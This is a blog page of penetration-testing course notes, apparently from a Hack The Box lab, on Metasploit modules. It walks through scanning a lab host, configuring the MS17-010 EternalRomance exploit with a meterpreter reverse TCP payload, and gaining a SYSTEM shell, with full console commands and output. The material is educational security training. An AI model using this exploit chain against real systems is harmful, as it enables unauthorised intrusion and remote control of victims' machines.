<!DOCTYPE html>
<html lang="en-US">

<head>
  <link rel="icon" type="image/png" sizes="48x48" href="../../../favicon.ico">
  <link rel="shortcut icon" href="../../../favicon.ico">
  <title>Hack The Box | Using Metasploit Framework</title>
  <meta name="author" content="Kappa">
  <meta name="description" content="Splash">
  <meta name="viewport" content="width=device-width">
  <link href='https://fonts.googleapis.com/css?family=Rock+Salt' rel='stylesheet' type='text/css'>
  <link href='https://fonts.googleapis.com/css?family=Orbitron:500' rel='stylesheet' type='text/css'>
  <link href='https://fonts.googleapis.com/css?family=Rochester' rel='stylesheet' type='text/css'>
  <link rel="stylesheet" href="../../labs.css" type="text/css">
</head>

<body>

  <!--
  _  __          _____  _____        
 | |/ /    /\   |  __ \|  __ \ /\    
 | ' /    /  \  | |__) | |__) /  \   
 |  <    / /\ \ |  ___/|  ___/ /\ \  
 | . \  / ____ \| |    | |  / ____ \ 
 |_|\_\/_/    \_\_|    |_| /_/    \_\
 
 -->

  <div id="page">
    <div id="nav">
      <ul>
        <li><a href="https://kapaajester83.github.io/">Home</a></li>
        <li><a href="https://kapaajester83.github.io/labs/contents.html">Labs</a></li>
        <li><a href="https://duckduckgo.com/" target="_blank">DuckGo</a></li>
        <li><a href="https://github.com/Kapaajester83?tab=repositories" target="_blank">About</a></li>
        <li><a href="mailto:kappajester83@gmail.com" target="_blank">Email</a></li>
      </ul>
    </div>
    <div id="logo">
      <img src="https://kapaajester83.github.io/logo.jpeg" alt="logo">
      <h1>Kappa</h1>

      <div>
        <br>
        <br>
        <br>
        <h2>“Great things are not done by impulse, but by a series of small things brought together.”</h2>
        <br>
        <br>
      </div>
    </div>

    <div id="writeup">
      <h3>
        <a href="../../contents.html">Hack The Box</a>
      </h3>
      <hr>

      <div id="labs-table-top">

        <h4><a href="../usingMetasploitFramework.htm">Using Metasploit Framework</a></h4>
        <ul>
          <li><a href="introductionMSFconsole.htm">Introduction to MSFconsole</a></li>
          <li><a href="modules.htm"><b><em>~ Modules</em></b></a></li>
          <li><a href="targets.htm">Targets</a></li>
        </ul>
      </div>
      <hr>

      <div>

        <h3><em>Modules</em></h3>

        <p>As we mentioned previously, Metasploit modules are prepared scripts with a specific purpose and corresponding functions that have already been developed and tested in the wild. The exploit category consists of so-called proof-of-concept (POCs) that can be used to exploit existing vulnerabilities in a largely automated manner. Many people often think that the failure of the exploit disproves the existence of the suspected vulnerability. However, this is only proof that the Metasploit exploit does not work and not that the vulnerability does not exist. This is because many exploits require customization according to the target hosts to make the exploit work. Therefore, automated tools such as the Metasploit framework should only be considered a support tool and not a substitute for our manual skills.</p>

        <p>Once we are in the msfconsole, we can select from an extensive list containing all the available Metasploit modules. Each of them is structured into folders, which will look like this:</p>

        <p>Syntax</p>

        <pre>
          "No."" "type"/"os"/"service"/"name"
          794   exploit/windows/ftp/scriptftp_list
        </pre>

        <h4>Index No.</h4>

        <p>The No. tag will be displayed to select the exploit we want afterward during our searches. We will see how helpful the No. tag can be to select specific Metasploit modules later.</p>

        <h4>Type</h4>

        <p>The Type tag is the first level of segregation between the Metasploit modules. Looking at this field, we can tell what the piece of code for this module will accomplish. Some of these types are not directly usable as an exploit module would be, for example. However, they are set to introduce the structure alongside the interactable ones for better modularization. To explain better, here are the possible types that could appear in this field:
        <ul>
          <li><b>Auxiliary</b> - Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.</li>
          <li><b>Encoders</b> - Ensure that payloads are intact to their destination.</li>
          <li><b>Exploits</b> - Defined as modules that exploit a vulnerability that will allow for the payload delivery.</li>
          <li><b>NOPs</b> - (No Operation code) Keep the payload sizes consistent across exploit attempts.</li>
          <li><b>Payloads</b> - Code runs remotely and calls back to the attacker machine to establish a connection (or shell).</li>
          <li><b>Plugins</b> - Additional scripts can be integrated within an assessment with msfconsole and coexist.</li>
          <li><b>Post</b> - Wide array of modules to gather information, pivot deeper, etc.</li>
        </ul>

        <p>Note that when selecting a module to use for payload delivery, the use "no." command can only be used with the following modules that can be used as initiators (or interactable modules):
        <ul>
          <li><b>Auxiliary</b> - Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.</li>
          <li><b>Exploits</b> - Defined as modules that exploit a vulnerability that will allow for the payload delivery.</li>
          <li><b>Post</b> - Wide array of modules to gather information, pivot deeper, etc.</li>
        </ul>

        <h4>OS</h4>

        <p>The OS tag specifies which operating system and architecture the module was created for. Naturally, different operating systems require different code to be run to get the desired results.</p>

        <h4>Service</h4>

        <p>The Service tag refers to the vulnerable service that is running on the target machine. For some modules, such as the auxiliary or post ones, this tag can refer to a more general activity such as gather, referring to the gathering of credentials, for example.</p>

        <h4>Name</h4>

        <p>Finally, the Name tag explains the actual action that can be performed using this module created for a specific purpose.</p>

        <h4>Searching for Modules</h4>

        <p>Metasploit also offers a well-developed search function for the existing modules. With the help of this function, we can quickly search through all the modules using specific tags to find a suitable one for our target.</p>

        <h4>MSF - Search Function</h4>

        <pre>
          msf6 > help search
        </pre>

        <p>Usage: search ["options"] ["keywords":"value"]</p>

        <p>Prepending a value with '-' will exclude any matching results.<br>
          If no options or keywords are provided, cached results are displayed.</p>

        <pre>
          OPTIONS:
            -h                   Show this help information
            -o "file"            Send output to a file in csv format
            -S "string"          Regex pattern used to filter search results
            -u                   Use module if there is one result
            -s "search_column"   Sort the research results based on "search_column" in ascending order
            -r                   Reverse the search results order to descending order

          Keywords:
            aka              :  Modules with a matching AKA (also-known-as) name
            author           :  Modules written by this author
            arch             :  Modules affecting this architecture
            bid              :  Modules with a matching Bugtraq ID
            cve              :  Modules with a matching CVE ID
            edb              :  Modules with a matching Exploit-DB ID
            check            :  Modules that support the 'check' method
            date             :  Modules with a matching disclosure date
            description      :  Modules with a matching description
            fullname         :  Modules with a matching full name
            mod_time         :  Modules with a matching modification date
            name             :  Modules with a matching descriptive name
            path             :  Modules with a matching path
            platform         :  Modules affecting this platform
            port             :  Modules with a matching port
            rank             :  Modules with a matching rank (Can be descriptive (ex: 'good') or numeric with comparison operators (ex: 'gte400'))
            ref              :  Modules with a matching ref
            reference        :  Modules with a matching reference
            target           :  Modules affecting this target
            type             :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)

          Supported search columns:
            rank             :  Sort modules by their exploitabilty rank
            date             :  Sort modules by their disclosure date. Alias for disclosure_date
            disclosure_date  :  Sort modules by their disclosure date
            name             :  Sort modules by their name
            type             :  Sort modules by their type
            check            :  Sort modules by whether or not they have a check method

          Examples:
            search cve:2009 type:exploit
            search cve:2009 type:exploit platform:-linux
            search cve:2009 -s name
            search type:exploit -s type -r
        </pre>

        <p>For example, we can try to find the EternalRomance exploit for older Windows operating systems. This could look something like this:</p>

        <h4>MSF - Searching for EternalRomance</h4>

        <pre>
          msf6 > search eternalromance

          Matching Modules
          ================

             #  Name                                  Disclosure Date  Rank    Check  Description
             -  ----                                  ---------------  ----    -----  -----------
             0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
             1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution

          msf6 > search eternalromance type:exploit

          Matching Modules
          ================

             #  Name                                  Disclosure Date  Rank    Check  Description
             -  ----                                  ---------------  ----    -----  -----------
             0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
        </pre>

        <p>We can also make our search a bit more coarse and reduce it to one category of services. For example, for the CVE, we could specify the year (cve:"year"), the platform Windows (platform:"os"), the type of module we want to find (type:"auxiliary/exploit/post"), the reliability rank (rank:"rank"), and the search name ("pattern"). This would reduce our results to only those that match all of the above.</p>

        <h4>MSF - Specific Search</h4>

        <pre>
          msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft

          Matching Modules
          ================

            #  Name                                            Disclosure Date  Rank       Check  Description
            -  ----                                            ---------------  ----       -----  -----------
            0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE
            1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
            2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE
        </pre>

        <h4>Module Selection</h4>

        <p>To select our first module, we first need to find one. Let's suppose that we have a target running a version of SMB vulnerable to EternalRomance (MS17_010) exploits. We have found that SMB server port 445 is open upon scanning the target.</p>

        <pre>
          kappajester83@htb[/htb]$ nmap -sV 10.10.10.40

          Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 21:38 UTC
          Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
          Nmap scan report for 10.10.10.40
          Host is up (0.051s latency).
          Not shown: 991 closed ports
          PORT      STATE SERVICE      VERSION
          135/tcp   open  msrpc        Microsoft Windows RPC
          139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
          445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
          49152/tcp open  msrpc        Microsoft Windows RPC
          49153/tcp open  msrpc        Microsoft Windows RPC
          49154/tcp open  msrpc        Microsoft Windows RPC
          49155/tcp open  msrpc        Microsoft Windows RPC
          49156/tcp open  msrpc        Microsoft Windows RPC
          49157/tcp open  msrpc        Microsoft Windows RPC
          Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

          Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
          Nmap done: 1 IP address (1 host up) scanned in 60.87 seconds
        </pre>

        <p>We would boot up msfconsole and search for this exact exploit name.</p>

        <h4>MSF - Search for MS17_010</h4>

        <pre>
          msf6 > search ms17_010

          Matching Modules
          ================

             #  Name                                      Disclosure Date  Rank     Check  Description
             -  ----                                      ---------------  ----     -----  -----------
             0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
             1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
             2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
             3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
        </pre>

        <p>Next, we want to select the appropriate module for this scenario. From the Nmap scan, we have detected the SMB service running on version Microsoft Windows 7 - 10. With some additional OS scanning, we can guess that this is a Windows 7 running a vulnerable instance of SMB. We then proceed to select the module with the index no. 2 to test if the target is vulnerable.</p>

        <h4>Using Modules</h4>

        <p>Within the interactive modules, there are several options that we can specify. These are used to adapt the Metasploit module to the given environment. Because in most cases, we always need to scan or attack different IP addresses. Therefore, we require this kind of functionality to allow us to set our targets and fine-tune them. To check which options are needed to be set before the exploit can be sent to the target host, we can use the show options command. Everything required to be set before the exploitation can occur will have a Yes under the Required column.</p>

        <h4>MSF - Select Module</h4>

        <pre>
          "SNIP"

          Matching Modules
          ================

            #  Name                                  Disclosure Date  Rank    Check  Description
            -  ----                                  ---------------  ----    -----  -----------
            0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
            1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
              
          msf6 > use 0
          msf6 exploit(windows/smb/ms17_010_psexec) > options

          Module options (exploit/windows/smb/ms17_010_psexec): 

          Name                  Current Setting                          Required  Description
          ----                  ---------------                          --------  -----------
          DBGTRACE              false                                    yes       Show extra debug trace info
          LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
          NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
          NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                                 rdlists/named_pipes.txt
          RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                                    /wiki/Using-Metasploit
          RPORT                 445                                      yes       The Target port (TCP)
          SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
          SERVICE_DISPLAY_NAME                                           no        The service display name
          SERVICE_NAME                                                   no        The service name
          SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                                    rmal read/write folder share
          SMBDomain             .                                        no        The Windows domain to use for authentication
          SMBPass                                                        no        The password for the specified username
          SMBUser                                                        no        The username to authenticate as

          Payload options (windows/meterpreter/reverse_tcp):

            Name      Current Setting  Required  Description
            ----      ---------------  --------  -----------
            EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
            LHOST                      yes       The listen address (an interface may be specified)
            LPORT     4444             yes       The listen port

          Exploit target:

            Id  Name
            --  ----
            0   Automatic
        </pre>

        <p>Here we see how helpful the No. tags can be. Because now, we do not have to type the whole path but only the number assigned to the Metasploit module in our search. We can use the command info after selecting the module if we want to know something more about the module. This will give us a series of information that can be important for us.</p>

        <h4>MSF - Module Information</h4>

        <pre>
          msf6 exploit(windows/smb/ms17_010_psexec) > info

                 Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
               Module: exploit/windows/smb/ms17_010_psexec
             Platform: Windows
                 Arch: x86, x64
           Privileged: No
              License: Metasploit Framework License (BSD)
                 Rank: Normal
            Disclosed: 2017-03-14

          Provided by:
            sleepya
            zerosum0x0
            Shadow Brokers
            Equation Group

          Available targets:
            Id  Name
            --  ----
            0   Automatic
            1   PowerShell
            2   Native upload
            3   MOF upload

          Check supported:
            Yes

          Basic options:
            Name                  Current Setting                          Required  Description
            ----                  ---------------                          --------  -----------
            DBGTRACE              false                                    yes       Show extra debug trace info
            LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
            NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
            NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                                  rdlists/named_pipes.txt
            RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
                                                                                     wiki/Using-Metasploit
            RPORT                 445                                      yes       The Target port (TCP)
            SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
            SERVICE_DISPLAY_NAME                                           no        The service display name
            SERVICE_NAME                                                   no        The service name
            SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a nor
                                                                                     mal read/write folder share
            SMBDomain             .                                        no        The Windows domain to use for authentication
            SMBPass                                                        no        The password for the specified username
            SMBUser                                                        no        The username to authenticate as

          Payload information:
            Space: 3072

          Description:
            This module will exploit SMB with vulnerabilities in MS17-010 to 
            achieve a write-what-where primitive. This will then be used to 
            overwrite the connection session information with as an 
            Administrator session. From there, the normal psexec payload code 
            execution is done. Exploits a type confusion between Transaction and 
            WriteAndX requests and a race condition in Transaction requests, as 
            seen in the EternalRomance, EternalChampion, and EternalSynergy 
            exploits. This exploit chain is more reliable than the EternalBlue 
            exploit, but requires a named pipe.

          References:
            https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
            https://nvd.nist.gov/vuln/detail/CVE-2017-0143
            https://nvd.nist.gov/vuln/detail/CVE-2017-0146
            https://nvd.nist.gov/vuln/detail/CVE-2017-0147
            https://github.com/worawit/MS17-010
            https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
            https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/

          Also known as:
            ETERNALSYNERGY
            ETERNALROMANCE
            ETERNALCHAMPION
            ETERNALBLUE
        </pre>

        <p>After we are satisfied that the selected module is the right one for our purpose, we need to set some specifications to customize the module to use it successfully against our target host, such as setting the target (RHOST or RHOSTS).</p>

        <h4>MSF - Target Specification</h4>

        <pre>
          msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40

          RHOSTS => 10.10.10.40

          msf6 exploit(windows/smb/ms17_010_psexec) > options

            Name                  Current Setting                          Required  Description
            ----                  ---------------                          --------  -----------
            DBGTRACE              false                                    yes       Show extra debug trace info
            LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
            NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
            NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                                   rdlists/named_pipes.txt
            RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                                      /wiki/Using-Metasploit
            RPORT                 445                                      yes       The Target port (TCP)
            SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
            SERVICE_DISPLAY_NAME                                           no        The service display name
            SERVICE_NAME                                                   no        The service name
            SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                                      rmal read/write folder share
            SMBDomain             .                                        no        The Windows domain to use for authentication
            SMBPass                                                        no        The password for the specified username
            SMBUser                                                        no        The username to authenticate as

          Payload options (windows/meterpreter/reverse_tcp):

            Name      Current Setting  Required  Description
            ----      ---------------  --------  -----------
            EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
            LHOST                      yes       The listen address (an interface may be specified)
            LPORT     4444             yes       The listen port

          Exploit target:

            Id  Name
            --  ----
            0   Automatic
        </pre>

        <p>In addition, there is the option setg, which specifies options selected by us as permanent until the program is restarted. Therefore, if we are working on a particular target host, we can use this command to set the IP address once and not change it again until we change our focus to a different IP address.</p>

        <h4>MSF - Permanent Target Specification</h4>

        <pre>
          msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40

          RHOSTS => 10.10.10.40

          msf6 exploit(windows/smb/ms17_010_psexec) > options

            Name                  Current Setting                          Required  Description
            ----                  ---------------                          --------  -----------
            DBGTRACE              false                                    yes       Show extra debug trace info
            LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
            NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
            NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                                   rdlists/named_pipes.txt
            RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                                      /wiki/Using-Metasploit
            RPORT                 445                                      yes       The Target port (TCP)
            SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
            SERVICE_DISPLAY_NAME                                           no        The service display name
            SERVICE_NAME                                                   no        The service name
            SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                                      rmal read/write folder share
            SMBDomain             .                                        no        The Windows domain to use for authentication
            SMBPass                                                        no        The password for the specified username
            SMBUser                                                        no        The username to authenticate as


          Payload options (windows/meterpreter/reverse_tcp):

            Name      Current Setting  Required  Description
            ----      ---------------  --------  -----------
            EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
            LHOST                      yes       The listen address (an interface may be specified)
            LPORT     4444             yes       The listen port

          Exploit target:

            Id  Name
            --  ----
            0   Automatic
        </pre>

        <p>Finally, since we are about to use a TCP-based reverse shell (/windows/meterpreter/reverse_tcp) we need to specify to which IP address it needs to connect to in order to establish a connection. Therefore, we need to set LHOST to our own IP address like following:</p>

        <h4>MSF - LHOST Specification</h4>

        <pre>
          msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15

          LHOSTS => 10.10.14.15

          msf6 exploit(windows/smb/ms17_010_psexec) > options

            Name                  Current Setting                          Required  Description
            ----                  ---------------                          --------  -----------
            DBGTRACE              false                                    yes       Show extra debug trace info
            LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
            NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
            NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                                   rdlists/named_pipes.txt
            RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                                      /wiki/Using-Metasploit
            RPORT                 445                                      yes       The Target port (TCP)
            SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
            SERVICE_DISPLAY_NAME                                           no        The service display name
            SERVICE_NAME                                                   no        The service name
            SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                                      rmal read/write folder share
            SMBDomain             .                                        no        The Windows domain to use for authentication
            SMBPass                                                        no        The password for the specified username
            SMBUser                                                        no        The username to authenticate as

          Payload options (windows/meterpreter/reverse_tcp):

            Name      Current Setting  Required  Description
            ----      ---------------  --------  -----------
            EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
            LHOST     10.10.14.15      yes       The listen address (an interface may be specified)
            LPORT     4444             yes       The listen port

          Exploit target:

            Id  Name
            --  ----
            0   Automatic
        </pre>

        <p>Once everything is set and ready to go, we can proceed to launch the attack. Note that the payload was not set here, as the default one is sufficient for this demonstration.</p>

        <h4>MSF - Exploit Execution</h4>

        <pre>
          msf6 exploit(windows/smb/ms17_010_psexec) > run

          [*] Started reverse TCP handler on 10.10.14.15:4444 
          [*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
          [+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
          [*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
          [*] 10.10.10.40:445 - Connecting to target for exploitation.
          [+] 10.10.10.40:445 - Connection established for exploitation.
          [+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
          [*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
          [*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
          [*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
          [*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
          [+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
          [*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
          [*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
          [*] 10.10.10.40:445 - Starting non-paged pool grooming
          [+] 10.10.10.40:445 - Sending SMBv2 buffers
          [+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
          [*] 10.10.10.40:445 - Sending final SMBv2 buffers.
          [*] 10.10.10.40:445 - Sending last fragment of exploit packet!
          [*] 10.10.10.40:445 - Receiving response from exploit packet
          [+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
          [*] 10.10.10.40:445 - Sending egg to corrupted connection.
          [*] 10.10.10.40:445 - Triggering free of corrupted buffer.
          [*] Command shell session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-13 21:37:21 +0000
          [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
          [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
          [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

          meterpreter> shell

          C:\Windows\system32>
        </pre>

        <p>We now have a shell on the target machine, and we can interact with it.</p>

        <h4>MSF - Target Interaction</h4>

        <pre>
          C:\Windows\system32> whoami
          whoami
          nt authority\system
        </pre>

        <p>This has been a quick and dirty example of how msfconsole can help out quickly but serves as an excellent example of how the framework works. Only one module was needed without any payload selection, encoding or pivoting between sessions or jobs.</p>

        <h4>Questions</h4>

        <p>Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer.</p>

      </div>
      <hr>

      <div id="labs-table">

        <h4><a href="../usingMetasploitFramework.htm">Using Metasploit Framework</a></h4>
        <ol>
          <li><a href="preface.htm">Preface</a></li>
          <li><a href="introductionMetasploit.htm">Introduction to Metasploit</a></li>
          <li><a href="introductionMSFconsole.htm">Introduction to MSFconsole</a></li>
          <li><a href="modules.htm"><b><em>~ Modules</em></b></a></li>
          <li><a href="targets.htm">Targets</a></li>
        </ol>
      </div>
      <hr>

    </div>
  </div>

  <div id="footer">
    <p>
      Webpage made by <a href="mailto:kappajester83@gmail.com">Kappa </a>
    </p>
  </div>

</html>